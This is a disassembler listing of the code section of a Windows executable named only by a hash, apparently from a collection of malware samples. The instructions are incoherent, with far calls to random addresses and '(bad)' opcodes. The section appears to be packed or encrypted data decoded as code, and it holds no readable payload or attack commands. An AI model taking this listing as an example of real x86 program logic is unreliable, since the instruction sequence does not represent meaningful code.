
c8d933ce95da949a001d0e610bc16fe7238df310bf209bbd93a5b175e2bb7020.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	mov    BYTE PTR [ecx],ah
  401002:	fwait
  401003:	cdq    
  401004:	js     0x401006
  401006:	add    BYTE PTR [edx+0x2a],cl
  401009:	add    BYTE PTR [eax-0x5fd36000],0x2
  401010:	pop    eax
  401011:	loopne 0x400fb3
  401013:	mov    DWORD PTR [esi],edx
  401015:	add    BYTE PTR [eax],dh
  401017:	adc    dl,BYTE PTR [eax]
  401019:	add    eax,0x2385088
  40101e:	sbb    BYTE PTR ds:0x2300e088,al
  401024:	add    BYTE PTR [ecx+0x802e8d8],cl
  40102a:	add    al,0x31
  40102c:	add    BYTE PTR [eax],al
  40102e:	or     BYTE PTR ds:0x3640ea02,al
  401034:	adc    BYTE PTR [eax-0x7f6ff27f],0x0
  40103b:	add    al,0x4e
  40103d:	or     BYTE PTR [eax],al
  40103f:	inc    eax
  401040:	add    BYTE PTR [eax-0x62],dh
  401043:	inc    edx
  401044:	ret    0x870
  401047:	add    ah,BYTE PTR [edx+0x20815b01]
  40104d:	inc    ecx
  40104e:	lock inc eax
  401050:	add    eax,0x40000009
  401055:	mov    DWORD PTR [ecx],eax
  401057:	inc    edx
  401058:	dec    edx
  401059:	xor    DWORD PTR [ecx+0x28301081],ebx
  40105f:	and    BYTE PTR [edx+0x29],al
  401062:	or     BYTE PTR [edx],dh
  401064:	or     cl,BYTE PTR [ecx]
  401066:	and    al,BYTE PTR [esi]
  401068:	add    eax,0x4a0212
  40106d:	push   eax
  40106e:	les    edx,FWORD PTR [eax+0x8]
  401071:	add    al,0x20
  401073:	add    dl,BYTE PTR ds:0x940d025d
  401079:	adc    eax,eax
  40107b:	out    0x40,al
  40107d:	or     BYTE PTR [eax+0x11],al
  401080:	cwde   
  401081:	pusha  
  401082:	adc    al,0x42
  401084:	or     DWORD PTR [ecx+0x4013e000],eax
  40108a:	add    DWORD PTR [ecx+0x42],eax
  40108d:	mov    al,ds:0x60480090
  401092:	or     edx,DWORD PTR [esi-0x3fe7dfed]
  401098:	xchg   DWORD PTR es:[eax],eax
  40109b:	and    eax,DWORD PTR ds:0x3420220
  4010a1:	rol    BYTE PTR [edi],0x10
  4010a4:	and    BYTE PTR [eax],al
  4010a6:	dec    eax
  4010a7:	push   esp
  4010a8:	add    al,0x1d
  4010aa:	or     BYTE PTR [eax+ebx*1+0x358213f],0x10
  4010b2:	adc    al,0x19
  4010b4:	add    BYTE PTR [eax+0x3b090e10],al
  4010ba:	add    al,BYTE PTR [edx+0x28]
  4010bd:	add    BYTE PTR [ecx],al
  4010bf:	add    BYTE PTR [edx-0x68efbedd],0x41
  4010c6:	inc    edx
  4010c7:	sub    DWORD PTR [edx+0x52],eax
  4010ca:	inc    ecx
  4010cb:	and    al,0x1
  4010cd:	or     BYTE PTR [eax+0x21026220],ah
  4010d3:	add    eax,0x58500008
  4010d8:	test   BYTE PTR [edx-0x4cdffbe0],al
  4010de:	xor    BYTE PTR [eax],al
  4010e0:	and    cl,al
  4010e2:	cmp    DWORD PTR [eax],eax
  4010e4:	dec    esp
  4010e5:	cs add al,0xb0
  4010e8:	or     BYTE PTR [eax+0x24],al
  4010eb:	or     BYTE PTR [eax],al
  4010ed:	je     0x40107a
  4010ef:	adc    ah,BYTE PTR [esp+eax*2]
  4010f2:	add    al,0x20
  4010f4:	loopne 0x4010a8
  4010f6:	add    dl,BYTE PTR [eax+0x95290ac]
  4010fc:	push   ds
  4010fd:	lods   al,BYTE PTR ds:[esi]
  4010fe:	xor    DWORD PTR [edx+0x16],eax
  401101:	inc    esi
  401102:	and    BYTE PTR [edi],dl
  401104:	push   ss
  401105:	add    BYTE PTR [eax],al
  401107:	add    eax,DWORD PTR [edx+0x61a9008]
  40110d:	push   es
  40110e:	inc    eax
  40110f:	lods   al,BYTE PTR ds:[esi]
  401110:	adc    al,0xd6
  401112:	add    BYTE PTR [eax],al
  401114:	mov    eax,ds:0x41432815
  401119:	xchg   edx,eax
  40111a:	inc    eax
  40111b:	pop    ecx
  40111c:	(bad)  
  40111e:	add    eax,DWORD PTR [eax]
  401120:	inc    eax
  401121:	push   eax
  401122:	adc    BYTE PTR [esi],al
  401124:	retf   0x6810
  401127:	and    eax,DWORD PTR [edx+0x58]
  40112a:	adc    BYTE PTR [edx-0x59bb099f],0x80
  401131:	push   esp
  401132:	add    cl,al
  401134:	add    BYTE PTR [ecx],cl
  401136:	mov    al,0x80
  401138:	or     BYTE PTR [eax-0x3dfabdc0],cl
  40113e:	or     BYTE PTR [eax],dl
  401140:	adc    al,al
  401142:	xchg   ecx,eax
  401143:	sbb    ah,BYTE PTR [edi+0xc]
  401146:	xor    eax,0x984a040
  40114b:	inc    esi
  40114c:	or     BYTE PTR [eax-0x60],al
  40114f:	add    al,0x13
  401151:	inc    eax
  401152:	std    
  401153:	push   eax
  401154:	pusha  
  401155:	add    ah,BYTE PTR [esi]
  401157:	pop    ebx
  401158:	adc    BYTE PTR [eax+eax*1+0x196302],0xe1
  401160:	add    BYTE PTR [eax+eax*2],ah
  401163:	xchg   DWORD PTR [ecx+edx*2],eax
  401166:	add    BYTE PTR [edx],dl
  401168:	rol    BYTE PTR [ebx-0x7e3dbcdf],0x18
  40116f:	dec    ecx
  401170:	inc    esp
  401171:	sub    BYTE PTR [ecx],al
  401173:	fs call 0xb000:0x140a06c4
  40117b:	sub    BYTE PTR [eax],al
  40117d:	inc    esp
  40117e:	and    BYTE PTR [edx],0x0
  401181:	or     BYTE PTR [edi+0x35c0b048],al
  401187:	sbb    dl,BYTE PTR [eax+ecx*1]
  40118a:	inc    eax
  40118b:	or     DWORD PTR [eax+0x30],esp
  40118e:	push   ecx
  40118f:	sub    BYTE PTR [eax],al
  401191:	adc    DWORD PTR [eax],edx
  401193:	nop
  401194:	add    BYTE PTR [eax],0x4c
  401197:	push   ecx
  401198:	pop    eax
  401199:	inc    eax
  40119a:	push   cs
  40119b:	inc    ecx
  40119c:	sub    al,0x6
  40119e:	and    dh,ah
  4011a0:	add    BYTE PTR [esi],cl
  4011a2:	add    BYTE PTR [eax],al
  4011a4:	add    DWORD PTR [ebx+ecx*1],eax
  4011a7:	out    0x89,eax
  4011a9:	and    al,0x72
  4011ab:	inc    eax
  4011ac:	bound  ecx,QWORD PTR [edx-0x55473b78]
  4011b2:	adc    DWORD PTR [eax+edx*1+0x3c],eax
  4011b6:	inc    eax
  4011b7:	add    eax,0x1050000
  4011bc:	sbb    al,0x8
  4011be:	pusha  
  4011bf:	and    al,BYTE PTR [edx+0x61010300]
  4011c5:	add    al,dh
  4011c7:	jno    0x4011c9
  4011c9:	add    DWORD PTR [edi],esp
  4011cb:	inc    edx
  4011cc:	es inc esp
  4011ce:	inc    esp
  4011cf:	adc    BYTE PTR [eax-0x7b937fd8],ah
  4011d5:	push   es
  4011d6:	add    BYTE PTR [ecx+eax*1],al
  4011d9:	xor    al,0x80
  4011db:	adc    BYTE PTR [ecx],al
  4011dd:	test   al,0x5c
  4011df:	or     BYTE PTR [eax+0x304404c0],dh
  4011e5:	dec    eax
  4011e6:	pop    edx
  4011e7:	and    al,0x80
  4011e9:	add    BYTE PTR fs:[eax+0x25041621],al
  4011f0:	or     al,al
  4011f2:	inc    eax
  4011f3:	push   ebx
  4011f4:	and    eax,0x4000204d
  4011f9:	mov    esi,0x40306114
  4011fe:	xor    DWORD PTR [eax+esi*1],esp
  401201:	call   0x5008:0x89468000
  401208:	adc    DWORD PTR [ecx],eax
  40120a:	add    BYTE PTR [ecx],dh
  40120c:	add    BYTE PTR [eax],dl
  40120e:	adc    BYTE PTR [eax],dh
  401210:	or     al,BYTE PTR [edx+0x11194103]
  401216:	and    BYTE PTR [eax],cl
  401218:	sbb    BYTE PTR [eax],ah
  40121a:	add    eax,DWORD PTR [eax+0x42]
  40121d:	add    DWORD PTR [ebx],ebx
  40121f:	and    BYTE PTR [eax+ecx*1+0x40450],al
  401226:	add    al,BYTE PTR [ecx+0x0]
  401229:	xchg   BYTE PTR [ecx+0x2105d02],al
  40122f:	mov    eax,ds:0x200c0
  401234:	mov    cs,WORD PTR [eax]
  401236:	repnz and al,BYTE PTR [edx+edx*4]
  40123a:	add    al,0x90
  40123c:	or     al,0x42
  40123e:	add    DWORD PTR [ebx+ecx*1],0x5c
  401242:	add    BYTE PTR [ebp+0x424000],cl
  401248:	test   al,0x1
  40124a:	jb     0x40127c
  40124c:	add    BYTE PTR [esp+ebp*4+0x2441a802],cl
  401253:	and    BYTE PTR [eax+eiz*1],bl
  401256:	xor    al,0x0
  401258:	push   esp
  401259:	pop    es
  40125a:	or     BYTE PTR [ecx],al
  40125c:	inc    eax
  40125d:	add    eax,DWORD PTR [esp+eax*1+0x2880cf]
  401264:	jo     0x401290
  401266:	add    bl,BYTE PTR [eax]
  401268:	add    al,0xc4
  40126a:	cmp    dl,BYTE PTR [edx]
  40126c:	add    BYTE PTR [edx-0x7c36dfbd],al
  401272:	int3   
  401273:	add    BYTE PTR ds:0xe9004261,al
  401279:	test   DWORD PTR [eax+eax*1+0x10],eax
  40127d:	push   edx
  40127e:	add    cl,cl
  401280:	inc    edx
  401281:	add    esp,DWORD PTR [eax]
  401283:	xchg   ebx,eax
  401284:	mov    al,ds:0x81081008
  401289:	inc    eax
  40128a:	fs or  al,0x6
  40128d:	add    BYTE PTR ds:0x2001120,cl
  401293:	sbb    eax,0x618840a2
  401298:	add    DWORD PTR [ecx+0x3b],0x689a318
  40129f:	add    BYTE PTR [esi],al
  4012a1:	adc    BYTE PTR [eax],0x78
  4012a4:	add    al,0x4a
  4012a6:	adc    BYTE PTR [eax],0x81
  4012a9:	popa   
  4012aa:	nop
  4012ab:	cdq    
  4012ac:	xchg   ecx,eax
  4012ad:	add    BYTE PTR [ebx],al
  4012af:	xor    BYTE PTR [eax+0x14],0x24
  4012b3:	or     dl,BYTE PTR [eax+eax*8]
  4012b6:	adc    eax,DWORD PTR [eax]
  4012b8:	and    BYTE PTR [eax+0x1a],al
  4012bb:	sub    eax,0x14609170
  4012c0:	add    eax,0x8080989
  4012c5:	mov    eax,ds:0x17848053
  4012ca:	ins    BYTE PTR es:[edi],dx
  4012cb:	add    al,0x42
  4012cd:	or     dh,dh
  4012cf:	test   BYTE PTR [edx+0x28],al
  4012d2:	add    DWORD PTR [eax],edx
  4012d4:	adc    BYTE PTR [eax+0x45020886],dh
  4012da:	or     al,BYTE PTR [ebx]
  4012dc:	push   esp
  4012dd:	add    BYTE PTR [ebp+0x452c1164],ah
  4012e3:	or     al,0x8
  4012e5:	test   DWORD PTR [eax],ecx
  4012e7:	add    BYTE PTR [edx],ah
  4012e9:	inc    eax
  4012ea:	bound  eax,QWORD PTR [eax+0x1080080b]
  4012f0:	add    al,0x28
  4012f2:	add    eax,0x90000082
  4012f7:	and    BYTE PTR [edx],al
  4012f9:	lea    esp,[ecx+0x48]
  4012fc:	adc    DWORD PTR [ecx+0x8330400],0x12
  401303:	adc    cl,BYTE PTR [ebp-0x60]
  401306:	enter  0x14,0xac
  40130a:	inc    eax
  40130b:	or     BYTE PTR [eax+0x61],al
  40130e:	adc    al,dl
  401310:	and    al,0x41
  401312:	xchg   esp,eax
  401313:	push   esp
  401314:	dec    eax
  401315:	add    BYTE PTR [edx+0x40],bl
  401318:	add    BYTE PTR [edx],ah
  40131a:	add    BYTE PTR [eax-0x70],bl
  40131d:	and    DWORD PTR [edx],eax
  40131f:	test   dl,al
  401321:	add    BYTE PTR [eax],0x2
  401324:	jne    0x4012a7
  401326:	add    BYTE PTR [eax],cl
  401328:	inc    eax
  401329:	inc    edx
  40132a:	or     cl,BYTE PTR [edx]
  40132c:	ret    0x8180
  40132f:	xor    al,BYTE PTR [eax+0x52060092]
  401335:	add    ah,BYTE PTR [ecx+0x28]
  401338:	cmp    BYTE PTR [edx+eax*4],ah
  40133b:	sub    ah,BYTE PTR [eax]
  40133d:	inc    esp
  40133e:	add    BYTE PTR [esp+edx*1],dh
  401341:	add    eax,0x425709
  401346:	inc    edx
  401347:	dec    eax
  401348:	push   ds
  401349:	push   es
  40134a:	and    BYTE PTR [eax+eiz*8+0x2e0a48e8],al
  401351:	add    al,0x25
  401353:	pop    ecx
  401354:	adc    al,0x10
  401356:	push   gs
  401358:	or     DWORD PTR [eax-0x80],0x182920a0
  40135f:	add    BYTE PTR [esp+edx*2],al
  401362:	add    BYTE PTR [ecx],al
  401364:	add    eax,DWORD PTR [esi+0x2]
  401367:	adc    al,BYTE PTR [eax]
  401369:	push   esp
  40136a:	ror    BYTE PTR [esi-0x6fff7cd0],0x48
  401371:	enter  0x20,0x12
  401375:	add    DWORD PTR [edx+ecx*2+0x0],0x135326a
  40137d:	sbb    DWORD PTR [edx+0x8100003],ecx
  401383:	ror    BYTE PTR [esp+0x61c64128],0x8
  40138b:	and    eax,0x39800480
  401390:	test   DWORD PTR [eax+0x0],ecx
  401393:	fld    QWORD PTR [eax]
  401395:	adc    al,0x4
  401397:	adc    BYTE PTR [edx-0x3cff65e2],cl
  40139d:	sub    BYTE PTR [eax+eax*2+0x41],ah
  4013a1:	push   eax
  4013a2:	push   cs
  4013a3:	push   eax
  4013a4:	adc    BYTE PTR [esp+eax*1],0x10
  4013a8:	sub    BYTE PTR [ebx],al
  4013aa:	adc    ah,BYTE PTR [eax+0x2]
  4013ad:	test   BYTE PTR [ecx],dl
  4013af:	push   ss
  4013b0:	add    al,0x76
  4013b2:	add    BYTE PTR [eax],al
  4013b4:	adc    dl,BYTE PTR [edx]
  4013b6:	add    BYTE PTR [eax-0x5cbffbbe],0x3
  4013bd:	inc    eax
  4013be:	and    DWORD PTR [eax-0x3f7e5800],eax
  4013c4:	sbb    al,0x80
  4013c6:	dec    eax
  4013c7:	push   edx
  4013c8:	xor    eax,DWORD PTR [eax]
  4013ca:	test   DWORD PTR [edx],eax
  4013cc:	and    al,bh
  4013ce:	push   es
  4013cf:	sub    BYTE PTR [eax],al
  4013d1:	test   BYTE PTR [edx],dl
  4013d3:	ror    BYTE PTR [edx-0x7f6ae000],0x0
  4013da:	push   eax
  4013db:	mov    al,ds:0x8422c00
  4013e0:	xchg   esi,eax
  4013e1:	adc    ch,BYTE PTR [eax-0x80]
  4013e4:	and    ecx,DWORD PTR [ebx+0x20]
  4013e7:	dec    ecx
  4013e8:	adc    BYTE PTR [edx+eax*1+0x47],dl
  4013ec:	adc    BYTE PTR [esi],0x80
  4013ef:	or     al,0x82
  4013f1:	push   ss
  4013f2:	add    BYTE PTR [ecx],0x8
  4013f5:	or     BYTE PTR [ecx],bl
  4013f7:	shl    DWORD PTR [ecx+0x20],0x2
  4013fb:	add    eax,DWORD PTR [eax]
  4013fd:	mov    dl,0x4
  4013ff:	add    eax,0xa2d91a15
  401404:	pusha  
  401405:	or     al,BYTE PTR [eax+0x1f0042e0]
  40140b:	inc    eax
  40140c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40140d:	add    al,BYTE PTR [ebx]
  40140f:	xchg   edx,eax
  401410:	inc    ecx
  401411:	adc    ecx,DWORD PTR [ebx]
  401413:	pusha  
  401414:	add    DWORD PTR [ebx],eax
  401416:	adc    BYTE PTR [eax],0x40
  401419:	or     al,0xc2
  40141b:	loopne 0x40141d
  40141d:	inc    esp
  40141e:	call   0x1432623
  401423:	or     BYTE PTR [eax],al
  401425:	or     DWORD PTR [edx],esp
  401427:	add    BYTE PTR [ebp+0x41600203],al
  40142d:	shl    BYTE PTR [eax],0x45
  401430:	cmp    BYTE PTR [edx],cl
  401432:	ret    0x1229
  401435:	xor    al,BYTE PTR [eax]
  401437:	xor    BYTE PTR [ecx+0x4325648],ah
  40143d:	pop    eax
  40143e:	xchg   esp,eax
  40143f:	test   DWORD PTR [edx],0x34310472
  401445:	add    DWORD PTR [eax],0x25
  401448:	mov    al,ds:0x456250c
  40144d:	jo     0x40142f
  40144f:	inc    esp
  401450:	nop
  401451:	add    BYTE PTR [eax-0x7eef97d4],0x0
  401458:	nop
  401459:	adc    BYTE PTR [ecx],al
  40145b:	pusha  
  40145c:	and    cl,BYTE PTR [edx]
  40145e:	inc    eax
  40145f:	mov    eax,ds:0x12010802
  401464:	nop    DWORD PTR [eax-0x60]
  401468:	add    BYTE PTR [edx+0x39904a4],cl
  40146e:	cdq    
  40146f:	and    al,0x22
  401471:	add    BYTE PTR [eax],al
  401473:	add    DWORD PTR [edx+esi*1],0x6
  401477:	or     BYTE PTR [edx-0x61fe5ef6],bl
  40147d:	inc    esp
  40147e:	inc    edi
  40147f:	nop
  401480:	mov    DWORD PTR [eax],edx
  401482:	sbb    BYTE PTR [eax+eax*4],cl
  401485:	xor    dl,BYTE PTR [ecx+0x48899249]
  40148b:	cmp    esp,DWORD PTR [eax]
  40148d:	push   es
  40148e:	adc    dl,BYTE PTR [ebx+ecx*1]
  401491:	inc    eax
  401492:	mov    BYTE PTR [eax+eax*2],al
  401495:	mov    al,ds:0x20028458
  40149a:	inc    eax
  40149b:	aam    0x45
  40149d:	loopne 0x40148a
  40149f:	add    BYTE PTR [eax-0x5fcda000],0x11
  4014a6:	and    DWORD PTR [esi+eax*1+0x24],edx
  4014aa:	call   0x5215ef
  4014af:	add    BYTE PTR [edx],al
  4014b1:	rcl    DWORD PTR [eax],0x0
  4014b4:	sbb    eax,0x2908c086
  4014b9:	adc    al,BYTE PTR [eax+eiz*1]
  4014bc:	inc    ebp
  4014bd:	rcl    BYTE PTR [eax],0x18
  4014c0:	or     BYTE PTR [eax],ah
  4014c2:	add    BYTE PTR [eax+eax*4],al
  4014c5:	adc    BYTE PTR [ecx],0x68
  4014c8:	or     DWORD PTR [eax+0x1295404],0x2082408
  4014d2:	add    BYTE PTR [edx-0x56],dh
  4014d5:	data16 add BYTE PTR ds:0x19200804,al
  4014dc:	push   es
  4014dd:	mov    ds:0x88e08023,al
  4014e2:	add    BYTE PTR [ecx],0x0
  4014e5:	inc    edx
  4014e6:	push   ecx
  4014e7:	add    eax,DWORD PTR [eax+0x27c410]
  4014ed:	rol    BYTE PTR [edx],cl
  4014ef:	and    esi,DWORD PTR [bp+si]
  4014f2:	and    BYTE PTR [ecx],cl
  4014f4:	and    BYTE PTR [eax-0x50],ah
  4014f7:	add    BYTE PTR [edx],cl
  4014f9:	or     edx,DWORD PTR [eax]
  4014fb:	add    BYTE PTR [eax],cl
  4014fd:	mov    al,ds:0x40009458
  401502:	popa   
  401503:	add    ch,BYTE PTR [eax+0x1a]
  401506:	mov    al,0x5d
  401508:	add    al,0xf7
  40150a:	or     BYTE PTR [esi-0x77fb5bc0],al
  401510:	xor    BYTE PTR [eax+eax*4+0x3],cl
  401514:	and    al,0x85
  401516:	aam    0x1f
  401518:	or     BYTE PTR [ebx],0xb6
  40151b:	and    al,0x21
  40151d:	push   ss
  40151e:	add    esp,DWORD PTR [eax]
  401520:	add    eax,0x825000c
  401525:	add    DWORD PTR [esi],eax
  401527:	add    BYTE PTR [eax+ebp*1+0x8],ah
  40152b:	loopne 0x4014cd
  40152d:	xor    al,0x98
  40152f:	cmp    BYTE PTR [edx],0x8
  401532:	sbb    eax,0x2c860000
  401537:	cwde   
  401538:	or     BYTE PTR [eax+0x1],al
  40153b:	or     eax,0x10880ca1
  401540:	xchg   ecx,eax
  401541:	inc    ecx
  401542:	and    al,BYTE PTR [ecx-0x2d5ddd3e]
  401548:	sub    BYTE PTR [eax+0x0],dl
  40154b:	pusha  
  40154c:	pop    ebp
  40154d:	sub    al,BYTE PTR [eax+0x40600082]
  401553:	sbb    al,BYTE PTR [ebx+eiz*4+0x45]
  401557:	inc    ecx
  401558:	add    cl,BYTE PTR [edx]
  40155a:	or     al,0x2
  40155c:	test   DWORD PTR [eax],eax
  40155e:	popa   
  40155f:	add    eax,DWORD PTR [eax]
  401561:	es dec ebx
  401563:	fs xor al,0x24
  401566:	add    BYTE PTR [edx+esi*1],0x1
  40156a:	adc    DWORD PTR [edx+0x80b202c],ecx
  401570:	mov    al,ds:0xa2004041
  401575:	pusha  
  401576:	into   
  401577:	jo     0x401519
  401579:	or     BYTE PTR [ecx],al
  40157b:	add    BYTE PTR [eax],0x83
  40157e:	add    BYTE PTR [esi-0x7ffbfffc],ch
  401584:	add    BYTE PTR [ecx+0x8],0x1
  401588:	add    BYTE PTR ds:0x10c48342,al
  40158e:	push   eax
  40158f:	dec    ecx
  401590:	add    DWORD PTR [ecx+0x2],eax
  401593:	sbb    DWORD PTR [eax],ecx
  401595:	mov    al,ds:0x84908889
  40159a:	or     al,0x47
  40159c:	and    BYTE PTR [edx+0x46480644],dh
  4015a2:	mov    dl,0x29
  4015a4:	rol    BYTE PTR [ecx+0x10],0x41
  4015a8:	add    BYTE PTR [esi+0xc],ah
  4015ab:	fadd   QWORD PTR [esi]
  4015ad:	add    al,BYTE PTR [eax-0x7c]
  4015b0:	mov    ds:0xc020500e,al
  4015b5:	push   eax
  4015b6:	or     BYTE PTR [eax],al
  4015b8:	xor    BYTE PTR [ecx-0x7a],bl
  4015bb:	rol    BYTE PTR [ecx],0x20
  4015be:	adc    BYTE PTR [eax+0x48],dl
  4015c1:	adc    ch,al
  4015c3:	add    DWORD PTR [ebx],eax
  4015c5:	add    BYTE PTR fs:0x4290c010,al
  4015cc:	or     BYTE PTR [edx+esi*1],0x2
  4015d0:	or     BYTE PTR [esp+eax*2],ch
  4015d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015d4:	inc    esi
  4015d5:	add    DWORD PTR [ecx+0x1],eax
  4015d8:	and    al,0x8c
  4015da:	push   es
  4015db:	and    BYTE PTR [ebx],dl
  4015dd:	add    BYTE PTR [eax+eax*1],0x41
  4015e1:	xchg   ebp,eax
  4015e2:	mov    BYTE PTR [eax],dh
  4015e4:	ror    BYTE PTR [ecx+0x12],0x12
  4015e8:	add    BYTE PTR [eax-0x7f],dl
  4015eb:	and    al,0x12
  4015ed:	sub    BYTE PTR [edx+0x41],dl
  4015f0:	inc    eax
  4015f1:	push   cs
  4015f2:	adc    BYTE PTR [eax],al
  4015f4:	add    BYTE PTR [edx],0x5d
  4015f7:	xor    ah,BYTE PTR [ecx]
  4015f9:	adc    BYTE PTR [eax],dl
  4015fb:	inc    eax
  4015fc:	add    BYTE PTR [eax+esi*1],ah
  4015ff:	add    bl,BYTE PTR [eax+eiz*1]
  401602:	xchg   BYTE PTR [edx+0x3190260d],ch
  401608:	adc    edx,DWORD PTR [esi+eiz*2]
  40160b:	sbb    eax,eax
  40160d:	rcl    BYTE PTR [ecx],1
  40160f:	mov    WORD PTR [eax],ss
  401611:	adc    BYTE PTR [eax],dh
  401613:	xchg   edx,eax
  401614:	inc    eax
  401615:	and    DWORD PTR [edi],eax
  401617:	sbb    al,BYTE PTR [eax+0x30]
  40161a:	mov    ?,WORD PTR [ebx+eiz*1]
  40161d:	push   esp
  40161e:	mov    ds:0x42002024,al
  401623:	dec    edx
  401624:	jno    0x401629
  401626:	adc    al,0x2
  401628:	in     al,0x8
  40162a:	mov    al,ch
  40162c:	or     DWORD PTR [edx],eax
  40162e:	enter  0x1604,0x2
  401632:	xchg   ecx,eax
  401633:	push   es
  401634:	and    ch,BYTE PTR [ebp+0xc]
  401637:	rol    DWORD PTR [edx+ebx*1-0x7e],0x10
  40163c:	sub    DWORD PTR [eax],eax
  40163e:	or     al,BYTE PTR [eax]
  401640:	sbb    BYTE PTR [ecx+0x29221016],cl
  401646:	or     BYTE PTR [edx],cl
  401648:	mov    BYTE PTR [edx],ah
  40164a:	sub    al,0xc0
  40164c:	rol    BYTE PTR [ecx],0x81
  40164f:	add    al,ah
  401651:	rcr    BYTE PTR [edx],0x82
  401654:	or     BYTE PTR [eax+0x528338a4],cl
  40165a:	add    DWORD PTR [eax],ebx
  40165c:	popa   
  40165d:	add    DWORD PTR [eax],ecx
  40165f:	or     DWORD PTR [ebx],ecx
  401661:	add    al,BYTE PTR ds:0x204211d8
  401667:	and    DWORD PTR [edx],edx
  401669:	fs push eax
  40166b:	sub    al,0xdb
  40166d:	rcl    BYTE PTR [eax+0x1],1
  401670:	xchg   ah,al
  401672:	mov    DWORD PTR [eax-0x80],esi
  401675:	add    eax,DWORD PTR [eax+0x70913090]
  40167b:	adc    eax,DWORD PTR [ecx+0x2085502]
  401681:	and    BYTE PTR [edx+0x34889034],cl
  401687:	mov    eax,0x424d010
  40168c:	repnz dec eax
  40168e:	pop    ebp
  40168f:	push   edx
  401690:	inc    eax
  401691:	jo     0x401693
  401693:	add    al,0x4
  401695:	add    al,0x0
  401697:	and    al,al
  401699:	dec    edx
  40169a:	add    DWORD PTR [eax+0x432c0341],ecx
  4016a0:	lahf   
  4016a1:	imul   eax,DWORD PTR [eax],0x311956b2
  4016a7:	js     0x4016c9
  4016a9:	add    eax,0x49060e2
  4016ae:	adc    BYTE PTR [ebx+0xa00810],dh
  4016b4:	rcr    DWORD PTR [eax],0xc1
  4016b7:	and    cl,BYTE PTR [edx+0x2]
  4016ba:	and    BYTE PTR [esi],al
  4016bc:	add    BYTE PTR [eax-0x80],al
  4016bf:	xchg   DWORD PTR [edx+0x4000b881],eax
  4016c5:	or     eax,0x224a7305
  4016ca:	add    al,0x2
  4016cc:	xor    al,ch
  4016ce:	inc    ecx
  4016cf:	inc    ebx
  4016d0:	adc    BYTE PTR [eax],al
  4016d2:	add    DWORD PTR [eax+eax*1+0x0],ecx
  4016d6:	or     BYTE PTR [edx+ecx*1+0x26137598],ch
  4016dd:	add    BYTE PTR [ecx],al
  4016df:	dec    ecx
  4016e0:	imul   ecx,DWORD PTR [esi],0x44010000
  4016e6:	sbb    ch,0x1
  4016e9:	imul   eax,DWORD PTR [eax],0x1eb0870
  4016ef:	enter  0xcc4,0x5d
  4016f3:	and    BYTE PTR [edx],al
  4016f5:	mov    ds:0x8c41679,al
  4016fa:	add    cl,bl
  4016fc:	mov    eax,ds:0x18208622
  401701:	push   es
  401702:	or     BYTE PTR [eax+ebp*1],al
  401705:	add    DWORD PTR [esp],eax
  401708:	(bad)  
  401709:	push   ecx
  40170a:	or     eax,DWORD PTR ds:0x80000524
  401710:	or     eax,DWORD PTR [eax+eax*4]
  401713:	test   DWORD PTR [eax+0x22],esp
  401716:	adc    al,BYTE PTR [edx+0x2087c82]
  40171c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40171d:	popf   
  40171e:	inc    edx
  40171f:	lock sub eax,0x34160202
  401725:	jmp    0xa0c1a74b
  40172a:	nop
  40172b:	or     BYTE PTR [eax-0x80],al
  40172e:	xor    ch,cl
  401730:	add    al,0x57
  401732:	pop    es
  401733:	es or  al,0x4
  401736:	adc    DWORD PTR [eax-0x79bfebf4],0xa
  40173d:	cmp    ebx,DWORD PTR ds:0x256008
  401743:	add    BYTE PTR [eax],al
  401745:	call   0x820a:0x10801922
  40174c:	and    BYTE PTR [edx],ah
  40174e:	mov    es,WORD PTR [eax]
  401750:	xor    BYTE PTR [eax],bl
  401752:	ret    
  401753:	bound  edx,QWORD PTR [esp+edx*1]
  401756:	mov    BYTE PTR ds:0x48890204,bl
  40175c:	inc    eax
  40175d:	sub    DWORD PTR [eax+ecx*2],edx
  401760:	and    al,0x41
  401762:	adc    al,ah
  401764:	inc    eax
  401765:	and    BYTE PTR [eax],ch
  401767:	inc    eax
  401768:	add    BYTE PTR [edx+0x40],ah
  40176b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40176c:	add    al,BYTE PTR [ecx+0x20a5c540]
  401772:	xchg   esi,eax
  401773:	xchg   edx,eax
  401774:	add    BYTE PTR [eax+edx*2],0x80
  401778:	add    ecx,eax
  40177a:	and    BYTE PTR [esp+ecx*4],dh
  40177d:	sbb    DWORD PTR [ecx],0x23
  401780:	adc    BYTE PTR [edx],cl
  401782:	inc    eax
  401783:	rcl    BYTE PTR [ecx+esi*4],0x50
  401787:	and    edx,DWORD PTR [eax+0x1]
  40178a:	lods   al,BYTE PTR ds:[esi]
  40178b:	and    al,0xa
  40178d:	and    BYTE PTR [edx],dl
  40178f:	mov    ah,0x1
  401791:	repz sbb BYTE PTR [ebx],ah
  401794:	cwde   
  401795:	xchg   edx,eax
  401796:	add    BYTE PTR [eax],dh
  401798:	add    BYTE PTR [eax],al
  40179a:	add    BYTE PTR [eax-0xe],al
  40179d:	inc    esi
  40179e:	sbb    DWORD PTR [eax+0x1],0x8c301823
  4017a5:	add    ecx,0x2880e999
  4017ab:	add    BYTE PTR [edx],al
  4017ad:	or     DWORD PTR [ecx],eax
  4017af:	add    BYTE PTR [eax],al
  4017b1:	or     DWORD PTR [edi],0x2444000
  4017b7:	sahf   
  4017b8:	inc    eax
  4017b9:	clc    
  4017ba:	add    BYTE PTR [edx],0x5
  4017bd:	test   BYTE PTR [esi],dl
  4017bf:	adc    BYTE PTR [eax-0x2ebffb7f],dl
  4017c5:	inc    edx
  4017c6:	add    edx,DWORD PTR [eax+0x1202141]
  4017cc:	or     BYTE PTR [eax+0x15ff0c00],dh
  4017d2:	mov    BYTE PTR [ebx+0x43],dl
  4017d5:	add    BYTE PTR [esi+0x75119002],ah
  4017db:	or     DWORD PTR [esp+eax*1],eax
  4017de:	add    BYTE PTR [eax],ah
  4017e0:	inc    ecx
  4017e1:	adc    BYTE PTR [edi-0x7c7dad3e],0x1
  4017e8:	sbb    BYTE PTR [eax],0x48
  4017eb:	add    BYTE PTR [eax],bl
  4017ed:	or     esp,DWORD PTR [edi]
  4017ef:	push   es
  4017f0:	inc    ecx
  4017f1:	inc    eax
  4017f2:	xchg   edi,eax
  4017f3:	push   es
  4017f4:	add    BYTE PTR [edi],dl
  4017f6:	add    BYTE PTR [eax],al
  4017f8:	out    0x20,al
